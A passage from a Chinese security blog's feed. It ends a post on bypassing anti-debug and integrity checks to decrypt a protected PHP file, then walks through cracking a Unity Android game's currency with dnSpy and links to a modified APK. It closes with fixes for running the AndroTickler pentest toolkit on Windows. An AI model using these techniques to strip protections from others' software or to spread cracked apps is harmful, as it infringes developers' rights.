= <span class="keyword">new</span> PrettyPrinter\Standard;</span><br><span class="line">$prettyCode = $prettyPrinter-&gt;prettyPrintFile($ast);</span><br><span class="line">file_put_contents(<span class="string">'9014/t2.php'</span>, $prettyCode);</span><br></pre></td></tr></table></figure><p>然后执行命令<code>php format.php</code>，会生成格式化的t2.php。<br><img src="11.jpg" alt="11"><br>选择一个不是多字节的字符集，这样在调试的时候可以显示出变量代表的内容。这里用的是<code>Western (ISO 8859-1)</code>。<br>我的思路是在程序开始下断点，然后一直F10（单步跳过），当程序中断时，在此处下断点，F11进入（单步调试）。找到中断的原因，解决后再重复上述操作。<br>F10运行时发现在102行退出了程序。<br><img src="12.jpg" alt="12"><br>然后在第102行下断点，F11单步运行。进入后继续F10运行。<br><img src="13.jpg" alt="13"><br>当运行到第23行时，程序退出。前面两个变量是多字节字符，所以看不到内容，后面的是die。看代码可以看到前两个分别在第13行和第15行出现。再次运行，当运行到第13行时F11进入。调用了第52行的函数（由于函数名是乱码，我们给起个名字<code>decode_func</code>）。<br><img src="14.jpg" alt="14"><br>直接在73行返回值处下断点，然后F5运行，看返回的结果。<br><img src="15.jpg" alt="15"><br>同理，查看第15行返回的结果。<br><img src="16.jpg" alt="16"><br>那么第23行处的代码为：<br><code>php_sapi_name() == &#39;cli&#39; ? die() : &#39;&#39;;</code><br><img src="17.jpg" alt="17"><br>由于这里是在命令行下执行的，所以会退出。找到了问题所在，直接注释掉此处即可。然后重新执行。运行至第26行时再次退出。<br><img src="18.jpg" alt="18"><br>此处代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_HOST'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_SERVER[<span class="string">'SERVER_ADDR'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>])) &#123; </span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由控制台发现<br><code>!isset($_SERVER[&#39;HTTP_HOST&#39;]) &amp;&amp; !isset($_SERVER[&#39;SERVER_ADDR&#39;]) &amp;&amp; !isset($_SERVER[&#39;REMOTE_ADDR&#39;])</code><br>执行结果为true，所以会退出。还是屏蔽该if判断即可。重新执行。<br><img src="19.jpg" alt="19"><br>第28-32行对应代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$t = microtime(<span class="keyword">true</span>) * <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">""</span>);</span><br><span class="line"><span class="keyword">if</span> (microtime(<span class="keyword">true</span>) * <span class="number">1000</span> - $t &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处判断执行时间大于100毫秒就退出，当然还是注释即可。<br>运行至第34行，程序退出。F11进入。调用了第52行的<code>decode_func</code>函数。<br><img src="20.jpg" alt="20"><br>直接查看返回值。<br><img src="21.jpg" alt="21"><br>第34行对应的代码为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!strpos(decode_func(substr($f, <span class="number">-45</span>, <span class="number">-1</span>)), md5(substr($f, <span class="number">0</span>, <span class="number">-46</span>))) ? $undefined1() : $undefined2;</span><br></pre></td></tr></table></figure><p><code>decode_func</code>是第52行的函数，$f是当前的文件，<code>$undefined1</code>和 <code>$undefined2</code>都不存在。查看<code>strpos</code>中两个参数。<br><img src="22.jpg" alt="22"><br>那么 <code>! strops(string,find)</code> 的结果为true。则执行<code>$undefined1()</code>，这个方法不存在，就会Error并退出程序。如下图所示。<br><img src="23.jpg" alt="23"><br>解决方法是注释第34行或者将”!”去掉。去掉”!”会执行 <code>$undefined2</code>，只会警告而不会退出。这里采用”暴力”的手段，直接注释掉了。<br>然后重新执行程序，F5运行到断点后，F11进入，然后F10运行。<br>运行到38行时，查看返回的内容，是源文件的内容。这个内容就是我们需要的。<br><img src="24.jpg" alt="24"><br>可以通过file_put_contents将文件保存即可。<br><img src="25.jpg" alt="25"><br>查看输出的结果。<br><img src="26.jpg" alt="26"><br>也可以在第102行用file_put_contents将文件保存。<br>使用原作者的decrypt.php也可解密。执行命令：<code>php decrypt.php 9014\t.php</code>，会生成解密后的文件”t.php.decrypted.php”。<br><img src="27.jpg" alt="27"></p><h4 id="2-LIB库加密"><a href="#2-LIB库加密" class="headerlink" title="2._LIB库加密"></a>2._LIB库加密</h4><p>调试过程和独立加密类似。<br><img src="28.jpg" alt="28"><br>还用之前的t.php作为源文件，加密后生成两个文件，一个是t.php，一个是_lib.php。<br><img src="29.jpg" alt="29"><br>这里的t.php就比较简单了，直接调用了_lib.php文件。主要研究的还是_lib.php文件。老规矩，还是先格式化。新建文件夹viptest，将t.php和格式化后的_lib.php复制进去。然后对格式化后的_lib.php进行编码转换。下断点开始进行调试。这里断点为106行。<br>然后浏览器访问，就会在断点处停止。F11进入后F10单步跳过。<br><img src="30.jpg" alt="30"><br>运行至第43行时退出，直接屏蔽这几行即可。然后重新访问。<br><img src="31.jpg" alt="31"><br>运行至第46行，校验数据完整性，由于_lib.php是格式化而来的代码，所以此处校验不通过，就会调用不存在的方法，然后产生错误而退出。<br>执行的代码为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$f = file_get_contents(<span class="string">'_lib.php'</span>);</span><br><span class="line">!strpos(decode_func(substr($f, <span class="number">-45</span>, <span class="number">-1</span>)), md5(substr($f, <span class="number">0</span>, <span class="number">-46</span>))) ? $undefined1() : $undefined2;</span><br></pre></td></tr></table></figure><p><img src="32.jpg" alt="32"><br>注释该校验即可。<br>继续执行，查看返回即可看到加密前的代码了。<br><img src="33.jpg" alt="33"></p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>类似此类的加密文件在进行调试时需要先将代码格式化，选择不是多字节的字符集，然后进行调试。我的测试流程是首先在开始下断点，然后F10执行，当遇到程序退出时，在此处下断点，再次运行，运行到此处F11进入。进入后F10执行，找到问题所在解决后重复上述流程。</p><p>这里都是以免费加密为例，关于VIP加密的可以参考作者的文章<a href="https://www.52pojie.cn/thread-693641-1-1.html" target="_blank" rel="noopener">【原创】某PHP加密文件调试解密过程</a> ，还有他的虚拟机加密解密的文章也值得学习。</p><p><a href="https://fuping.site/files/ctf.7z">所用的代码</a></p><h1 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h1><p><a href="https://www.52pojie.cn/thread-693641-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-693641-1-1.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程之美 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP解密 </tag>
            
            <tag> PHP调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unity3d类安卓游戏逆向分析初探</title>
      <link href="/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/"/>
      <url>/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>最近一款养蛙的游戏非常火，但是语言是日文的。下载了一个汉化的，结果广告一大堆。反编译之后查看是Unity游戏，之前没接触过，就想着跟着看一下。关于这类的破解，可以在52pojie上进行搜索。有很多类似的案例。<br>这里主要采用的工具为dnSpy，dnSpy 是一款针对 .NET 程序的逆向工程工具。反编译和打包采用的是apktool，当然也可以直接用改之理等工具。</p><a id="more"></a><h3 id="0x02-修改数据"><a href="#0x02-修改数据" class="headerlink" title="0x02 修改数据"></a>0x02 修改数据</h3><p>下载app后重命名为zip文件，发现存在assets\bin\Data\Managed目录，那么该游戏应该为Unity游戏。<br><img src="1.jpg" alt="查看apk文件"><br>那么需要分析的文件就是就是Assembly-CSharp.dll。</p><p>首先修改一下抽奖券的数量。安装游戏后，找到抽奖的地方。抽奖的时候提示券不足。<br><img src="2.jpg" alt="抽奖券不足"></p><p>使用dnSpy打开Assembly-CSharp.dll文件，然后搜索字符串”足”，可以发现有两个，打开后发现是第一个。<br><img src="3.jpg" alt="搜索字符串"><br>由此可以猜测TicketStock代表抽奖券库存。<br><img src="4.jpg" alt="抽奖券库存"><br>ticket表示抽奖券数量。<br><img src="5.jpg" alt="抽奖券数量"><br>当页查找ticket，发现有一个initialize方法进行初始化。我们将此处的数量改为1000.<br><img src="6.jpg" alt="初始化方法"><br>快捷键Ctrl+E编辑IL指令。找到ticket变量后，将ldc.i4.0改为ldc.i4，然后将数值改为1000.<br><img src="7.jpg" alt="编辑IL指令"><br>确定后，发现ticket数值已经改变。<br><img src="8.jpg" alt="抽奖券修改"><br>重新打包APP后，进行安装。<br><img src="9.png" alt="抽奖券改变"><br>打开抽奖界面发现数量已经改变为1000。<br><img src="10.png" alt="抽奖后抽奖券变动"><br>这样虽然达到了修改抽奖券的效果，但数量再大，总会被抽完的。那就换种方法，比如说抽奖的时候增加奖券，或者奖券一直不变。这里采用奖券数量固定的方法，使其不会变动。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (SuperGameMaster.TicketStock() &lt; <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ConfilmPanel confilm = <span class="keyword">this</span>.ConfilmUI.GetComponent&lt;ConfilmPanel&gt;();</span><br><span class="line">    confilm.OpenPanel(<span class="string">"ふくびき券が足りません"</span>);</span><br><span class="line">    confilm.ResetOnClick_Screen();</span><br><span class="line">    confilm.SetOnClick_Screen(delegate</span><br><span class="line">    &#123;</span><br><span class="line">        confilm.ClosePanel();</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>已知抽奖的时候奖券是从SuperGameMaster.TicketStock()获取的，找到该方法。令其返回值为固定的数值。<br><img src="11.jpg" alt="TicketStock方法"><br>右键编辑IL指令。<br><img src="12.jpg" alt="编辑IL指令"><br>将其值修改为9000.<br><img src="13.jpg" alt="修改返回值"><br>然后保存后打包并重新安装。<br><img src="14.png" alt="打包安装"><br>此时无论抽多少次，奖券都不再变化。<br>另一个就是修改三叶草的数量了。三叶草是该游戏中流行的货币，买东西都是需要该物品。同理找到CloverPointStock()方法。<br><img src="15.jpg" alt="修改三叶草"><br>将其返回值修改为8888。之后就可以随便买买买了，三叶草的数量也不会发生变化了。<br><img src="16.png" alt="三叶草数量"></p><h3 id="0x03-汉化"><a href="#0x03-汉化" class="headerlink" title="0x03 汉化"></a>0x03 汉化</h3><p>然后就是进行汉化了。汉化的方法和上面的类似。首先搜索需要修改的文字。例如给小青蛙起名字的时候。直接进行字符串搜索。<br><img src="17.jpg" alt="查找文字"><br>然后修改为对应的中文就行了。<br><img src="18.jpg" alt="日文修改为对应的中文"><br>进入游戏查看。<br><img src="19.png" alt="文字替换成功"><br>修改其他处的文字也是这样操作即可。当然这种修改方法比较慢，还有另外一种，直接将他人汉化过的dll文件复制进来，可以快速达到汉化的目的，也没有广告的烦恼了。</p><h3 id="0x04-其他修改"><a href="#0x04-其他修改" class="headerlink" title="0x04 其他修改"></a>0x04 其他修改</h3><p>按照以上方法修改的时候，每次都需要重新玩，还要经过”新手教学阶段”。我们可以使用安卓的备份功能，进行备份。然后重新安装app后直接恢复备份即可。<br>首先需要在AndroidManifest.xml文件中增加<code>android:allowBackup=&quot;true&quot;</code>。<br><img src="20.jpg" alt="修改AndroidManifest.xml文件"><br>这样就可以使用备份命令了。<br>命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb backup -nosystem -noshared -noapk -f jp.co.hit_point.tabikaeru.ab jp.co.hit_point.tabikaeru</span><br><span class="line">//-nosystem表示不备份系统应用 -noshared表示不备份应用存储在SD中的数据 -noapk表示不备份应用APK安装包 -f 表示备份的.ab文件路径和文件名 最后是要备份应用的packageName</span><br></pre></td></tr></table></figure><p><img src="23.jpg" alt="备份和恢复"><br>手机备份操作界面：<br><img src="21.png" alt="备份数据"></p><p>恢复命令比较简单</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb restore jp.co.hit_point.tabikaeru.ab</span><br></pre></td></tr></table></figure><p>手机备份还原界面<br><img src="22.png" alt="恢复数据"></p><p>然后就可以进行进度的保存和恢复了。就省去了每次都要进行”新手教学”的烦恼。</p><h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>这个游戏修改起来比较简单，首先判断为该游戏为Unity3d。然后使用dnSpy来对Assembly-CSharp.dll文件进行修改。根据特定的字符串找到需要修改的位置，修改后进行打包签名后即可。<br><a href="https://fuping.site/files/jp.co.hit_point.tabikaeru.apk">原版APK</a><br><a href="https://fuping.site/files/tabikaeru.apk">修改后的APK</a>（修改了抽奖券、三叶草和部分汉化）</p><h3 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h3><p>[1]<a href="https://www.52pojie.cn/search.php?mod=forum&amp;searchid=23262&amp;orderby=lastpost&amp;ascdesc=desc&amp;searchsubmit=yes&amp;kw=unity3d" target="_blank" rel="noopener">https://www.52pojie.cn/search.php?mod=forum&amp;searchid=23262&amp;orderby=lastpost&amp;ascdesc=desc&amp;searchsubmit=yes&amp;kw=unity3d</a><br>[2] <a href="https://www.52pojie.cn/thread-647612-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-647612-1-1.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 移动安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Unity3d </tag>
            
            <tag> 青蛙旅行 </tag>
            
            <tag> 逆向分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓渗透利器AndroTickler使用排雷指北</title>
      <link href="/2018/01/03/How-To-Use-AndroTickler/"/>
      <url>/2018/01/03/How-To-Use-AndroTickler/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>AndroTickler是一款用于Android应用程序渗透测试和审计的工具包。更多介绍可以参考<a href="https://github.com/ernw/AndroTickler" target="_blank" rel="noopener">https://github.com/ernw/AndroTickler</a> 。本文主要记录一下在使用过程中所遇到的问题和解决的方法。</p><p>本文的测试环境如下：系统为win10 x64，jdk版本为java8，gradle版本为4.1。采用了夜神模拟器。</p><p>主要包括以下几个方面。</p><ol><li>编译环境的准备</li><li>使用过程中遇到的问题以及解决方法</li></ol><a id="more"></a><h1 id="0x02-编译环境的准备"><a href="#0x02-编译环境的准备" class="headerlink" title="0x02 编译环境的准备"></a>0x02 编译环境的准备</h1><h2 id="1-Gradle的安装"><a href="#1-Gradle的安装" class="headerlink" title="1. Gradle的安装"></a>1. Gradle的安装</h2><p>首先需要安装Java，我采用的是Java8（安装工具说明，需要Java7以上）。下载地址：<a href="http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html</a> 。（安装过程省略）</p><p>关于gradle的安装可以参考<a href="https://gradle.org/install/" target="_blank" rel="noopener">https://gradle.org/install/</a> ，我这里是直接下载安装包<a href="https://services.gradle.org/distributions/gradle-4.4.1-bin.zip，" target="_blank" rel="noopener">https://services.gradle.org/distributions/gradle-4.4.1-bin.zip，</a> 解压之后添加环境变量。<br><img src="gradle%E5%AE%89%E8%A3%85.jpg" alt="gradle安装"></p><h2 id="2-cmder工具安装"><a href="#2-cmder工具安装" class="headerlink" title="2. cmder工具安装"></a>2. cmder工具安装</h2><p>该步骤非必需，可以省略。<br>下载地址：<a href="https://github.com/cmderdev/cmder/releases/" target="_blank" rel="noopener">https://github.com/cmderdev/cmder/releases/</a><br>解压添加环境变量即可使用。<br><img src="cmder%E5%B7%A5%E5%85%B7.jpg" alt="cmder工具"></p><blockquote><p>使用该工具除了界面好看外，可以多个tab，也可以运行部分linux命令。当然也可以使用其他工具，如cygwin。如果没有使用这类工具的话，需要将代码中一些命令修改，如<code>cp</code>命令。</p></blockquote><h2 id="3-Git工具安装"><a href="#3-Git工具安装" class="headerlink" title="3. Git工具安装"></a>3. Git工具安装</h2><p>该步骤非必需，可以省略。<br>下载地址：<a href="https://desktop.github.com/" target="_blank" rel="noopener">https://desktop.github.com/</a><br>安装即可。然后下载 <a href="https://github.com/ernw/AndroTickler" target="_blank" rel="noopener">AndroTickler</a><br><img src="%E4%B8%8B%E8%BD%BD.jpg" alt="下载"></p><h2 id="4-其他工具安装"><a href="#4-其他工具安装" class="headerlink" title="4.其他工具安装"></a>4.其他工具安装</h2><p>还需要安装adb, sqlite3, strings等工具。<br>adb的话安装夜神模拟器的时候自动，名字为nox_adb，功能一样。<br>sqlite3可以用<a href="https://www.sqlite.org/" target="_blank" rel="noopener">https://www.sqlite.org/</a> 下载。<br>strings的官网，<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/strings" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/sysinternals/downloads/strings</a> ，下载地址为：<br><a href="https://download.sysinternals.com/files/Strings.zip" target="_blank" rel="noopener">https://download.sysinternals.com/files/Strings.zip</a> 。解压后加入环境变量即可。</p><p>然后就是开始编译和使（入）用（坑）了。</p><h1 id="0x03-使用过程中遇到的问题以及解决方法"><a href="#0x03-使用过程中遇到的问题以及解决方法" class="headerlink" title="0x03 使用过程中遇到的问题以及解决方法"></a>0x03 使用过程中遇到的问题以及解决方法</h1><p>上面环境已经搭建好了，代码也下载了，然后就开始入坑吧。<br>编译的话很简单，使用命令<code>gradle &amp;&amp; gradle build</code>即可。<br><img src="%E7%BC%96%E8%AF%91.jpg" alt="编译"><br>然后会在build\libs目录下生成AndroTickler.jar文件。</p><p>软件生成了，那么看看有什么功能吧，使用命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar AndroTickler.jar -h</span><br></pre></td></tr></table></figure><p><img src="%E4%BD%BF%E7%94%A8%E5%B8%AE%E5%8A%A9.jpg" alt="使用帮助"></p><p>貌似一切正常。下面开始查看安装的app。</p><p>使用命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar AndroTickler.jar -pkgs</span><br></pre></td></tr></table></figure><p><img src="%E6%9F%A5%E7%9C%8B%E5%AE%89%E8%A3%85%E7%9A%84app1.jpg" alt="查看安装的app1"></p><p>并没有返回安装的app<br>已知列出已经安装的app命令是<code>adb shell pm list package</code><br>而我用的模拟器，所以应该使用命令是<code>nox_adb shell pm list package</code><br><img src="%E6%9F%A5%E7%9C%8B%E5%AE%89%E8%A3%85%E7%9A%84app2.jpg" alt="查看安装的app2"><br>所以这里要替换程序中的adb为nox_adb。<br>这里我用idea来打开代码<br>然后将命令中的<code>adb</code>替换为<code>nox_adb</code>即可<br><img src="%E6%9B%BF%E6%8D%A2adb%E5%91%BD%E4%BB%A4.jpg" alt="替换adb命令"><br>替换后重新编译并查看已安装的app。<br><img src="%E6%9F%A5%E7%9C%8B%E5%AE%89%E8%A3%85%E7%9A%84app3.jpg" alt="查看安装的app3"></p><p>发现列出了安装过的app。虽然有警告，暂且不管。<br>查找特定的app并查看信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar AndroTickler.jar -findPkg com.example.simpleencryption</span><br><span class="line">java -jar AndroTickler.jar -pkg com.example.simpleencryption -info</span><br></pre></td></tr></table></figure><p><img src="%E6%9F%A5%E7%9C%8Bapp%E4%BF%A1%E6%81%AF.jpg" alt="查看app信息"></p><p>发现报错，提示没有连接的设备。<br>通过adb查看连接的设备。<br><code>nox_adb devices -l</code><br><img src="%E8%BF%9E%E6%8E%A5%E7%9A%84%E8%AE%BE%E5%A4%87.jpg" alt="连接的设备"><br>发现有，但是使用工具未查看到。<br>通过错误的信息，定位到initialization\TicklerChecks.java的checkDevices方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkDevices</span><span class="params">()</span> <span class="keyword">throws</span> TNotFoundEx</span>&#123;</span><br><span class="line">String command = <span class="string">"nox_adb devices -l"</span>;</span><br><span class="line">Commando commando = <span class="keyword">new</span> Commando();</span><br><span class="line">String op = commando.executeCommand(command);</span><br><span class="line"></span><br><span class="line">OtherUtil oU = <span class="keyword">new</span> OtherUtil();</span><br><span class="line">ArrayList&lt;String&gt; devices = oU.getRegexFromString(op, <span class="string">"(model:.*?device:.+$?)"</span>);</span><br><span class="line"><span class="keyword">int</span> eligDevices = devices.size();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (eligDevices&gt;<span class="number">1</span>)</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> TNotFoundEx(<span class="string">"ERROR: 2 or more Android devices are connected to the host, please connect only one Android device."</span>);</span><br><span class="line"><span class="keyword">if</span> (eligDevices == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> TNotFoundEx(<span class="string">"ERROR: No Android devices detected by the host. Execute adb devices -l to check the connected devices"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现通过命令查询的结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">List of devices attached</span><br><span class="line">127.0.0.1:62025        device</span><br></pre></td></tr></table></figure><p>明显通过正则不能匹配，那就改正则了。<br>为了方便，直接改为<code>ArrayList&lt;String&gt; devices = oU.getRegexFromString(op, &quot;(.*device\\n)&quot;);</code></p><p>然后编译运行。<br><img src="%E6%9F%A5%E7%9C%8Bapp%E4%BF%A1%E6%81%AF1.jpg" alt="查看app信息1"><br>这个提示libs需要和jar文件在同一目录。将Tickler.conf和libs复制到与AndroTickler.jar同一目录。<br><img src="%E6%9F%A5%E7%9C%8Bapp%E4%BF%A1%E6%81%AF2.jpg" alt="查看app信息2"><br>竟然报同样的错误，而且该目录下出现了一个H的文件夹。<br>通过错误的信息，定位到initialization\TicklerChecks.java的checkExternalLibDir方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">checkExternalLibDir</span><span class="params">()</span> <span class="keyword">throws</span> TNotFoundEx</span>&#123;</span><br><span class="line">String jarLoc = <span class="keyword">this</span>.getJarLocation();</span><br><span class="line">String libDirLoc=jarLoc+TicklerConst.generalLibName;</span><br><span class="line">File tickLib = <span class="keyword">new</span> File (libDirLoc);</span><br><span class="line"><span class="keyword">if</span> (tickLib.exists())&#123;</span><br><span class="line">TicklerVars.isLib = <span class="keyword">true</span>;</span><br><span class="line">TicklerVars.libDir = libDirLoc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Lib directory not found</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> TNotFoundEx(<span class="string">"Lib directory not found. \nMake sure that "</span>+TicklerConst.generalLibName+<span class="string">" directory exists in the same directory as Tickler.jar"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看代码，tickLib由jarLoc和TicklerConst.generalLibName拼接，而<code>TicklerConst.generalLibName</code>是常量，所以需要查看<code>jarLoc</code>是如何获取的。跟进getJarLocation方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getJarLocation</span><span class="params">()</span></span>&#123;</span><br><span class="line">File myJar;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">File myJar1 = <span class="keyword">new</span> File(System.getProperty(<span class="string">"java.class.path"</span>));<span class="comment">//获取jar路径</span></span><br><span class="line">myJar = myJar1.getAbsoluteFile().getParentFile();<span class="comment">//获取jar上级目录</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">myJar = <span class="keyword">new</span> File(<span class="string">"."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String jarLoc = <span class="keyword">this</span>.correctJarLoc(myJar.getAbsolutePath());</span><br><span class="line"><span class="keyword">return</span> jarLoc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先获取了运行的jar的路径，然后获取其父路径并将其值赋值给myJar。然后调用了correctJarLoc方法。<br>进行跟进correctJarLoc方法，进去查看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">correctJarLoc</span><span class="params">(String jarLoc)</span></span>&#123;</span><br><span class="line">String finalLoc=jarLoc;</span><br><span class="line"><span class="keyword">if</span> (jarLoc.contains(<span class="string">":"</span>))<span class="comment">//wtf?  造成问题的代码</span></span><br><span class="line">finalLoc = jarLoc.substring(<span class="number">0</span>, jarLoc.indexOf(<span class="string">":"</span>));<span class="comment">//wtf?  造成问题的代码</span></span><br><span class="line"></span><br><span class="line">Matcher m = Pattern.compile(<span class="string">"\\s+(.+)"</span>).matcher(jarLoc);</span><br><span class="line"><span class="keyword">if</span> (m.find())</span><br><span class="line">finalLoc = m.group(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (finalLoc.matches(<span class="string">".+\\n$"</span>))&#123;</span><br><span class="line">finalLoc = finalLoc.substring(<span class="number">0</span>, jarLoc.length()-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (finalLoc.matches(<span class="string">".+\\.$"</span>))&#123;</span><br><span class="line">finalLoc = finalLoc.substring(<span class="number">0</span>, jarLoc.length()-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!finalLoc.matches(<span class="string">".+/$"</span>))&#123;</span><br><span class="line">finalLoc = finalLoc+<span class="string">"/"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> finalLoc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后立马发现问题的所在了。这里因为是windows系统，所以路径出现<code>:</code>是很正常的，而这里直接截取了盘符。<br>这就是出现了一个名为H的文件夹的原因。<br>解决方法：删除这两行代码即可。<br>之后再编译运行。<br><img src="%E6%9F%A5%E7%9C%8Bapp%E4%BF%A1%E6%81%AF3.jpg" alt="查看app信息3"><br>编译运行后发现警告没了，但新的错误出现了。<br>通过错误信息定位到apk\ApkToolClass.java的apkToolDecode方法。暂时先利用下面代码替换。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//File file = new File("/dev/null");</span></span><br><span class="line">File file = <span class="keyword">new</span> File(<span class="string">"H:\\tmp\\"</span>);</span><br></pre></td></tr></table></figure><blockquote><p>从之后文件的内容来看，该文件里面会记录一些操作记录。</p></blockquote><p>再次编译运行，没有任何结果信息也没有报错。<br><img 